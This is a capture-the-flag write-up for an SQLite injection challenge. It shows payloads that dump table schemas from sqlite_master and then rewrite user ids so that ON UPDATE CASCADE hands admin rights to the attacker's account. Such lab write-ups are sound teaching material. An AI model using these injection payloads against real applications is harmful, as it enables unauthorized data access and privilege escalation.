## Solve Process  
![image80](/static/writeups/photos/image80.png)  
This is another SQL Injection challenge, as given by the hints. We are able to update the name of the user, and we are always User \#1

It should be noted that only 1 sql statement can be executed at a time.

We can assume the update statement is something like:  
```sql
UPDATE users SET name = “<payload>” WHERE id = 1
```

We can get all the sql of every table in the database by submitting   
```sql
"||(SELECT GROUP\_CONCAT(sql, ',') 
FROM sqlite\_master  
WHERE type='table')||"
```  
As the payload. 

We have the SQL of each table now  
![image81](/static/writeups/photos/image81.png)  
Interestingly, we can see the roles table:  
CREATE TABLE roles\_1fdac33d39a84e4a (id INTEGER, admin INTEGER, FOREIGN KEY(id) REFERENCES users(id) **ON UPDATE CASCADE**)

We have a foreign key constraint, referencing the id in the users table. Notably, it is set to **ON UPDATE CASCADE.** This means that when we edit the id in the users table, it will update the corresponding id in the roles table.

Here, we also assume that the admin verification is hardcoded. Meaning, the verification goes something like:  
SELECT admin FROM roles\_\<roletable\> WHERE id \= 1  
This means that **we just need to make the id** of the admin become 1, since the id is all the sql statement looks at.

Since there already exists the admin user, who has a id of 0, we just need to abuse the ON UPDATE CASCADE to shift the admin user’s id to become 1\. 

## Injection Process  
Set the admin’s user id to be 2  
```sql
", id = 2 WHERE id = 0–- 
``` 
This will update the users table, which will cascade the roles table.  
**user**	

| id | name |
| :---- | :---- |
| 2 | admin |
| 1 | you |

The cascade will make the roles table look like this  
**roles**	

| id | name |
| :---- | :---- |
| 2 | 1 |
| 1 | 0 |

Then, we can shift all the id’s of the users down by one   
```sql
", id \= id-1–
```
### user	

| id | name |
| :---- | :---- |
| 1 | admin |
| 0 | you |

The cascade will make the roles table look like this  
### roles

| id | name |
| :---- | :---- |
| 1 | 1 |
| 0 | 0 |

This will give us the flag  
![image82](/static/writeups/photos/image82.png)